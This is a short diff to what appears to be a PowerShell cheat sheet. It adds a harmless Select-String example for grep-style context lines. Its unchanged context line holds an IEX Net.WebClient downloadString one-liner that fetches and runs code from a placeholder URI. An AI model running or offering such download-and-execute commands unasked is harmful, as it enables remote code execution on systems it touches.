@@ -21,3 +21,8 @@ powershell IEX(New-Object Net.Webclient).downloadString("<target uri>") #Invoke-
 ```powershell
 Get-Command <your command> | Select-Object -ExpandProperty Definition
 ```
+
+"grep"-like with x number of lines before or after.
+```powershell
+<whatever cmd> | Select-String -Pattern "whatevs" -Context 2,4
+```
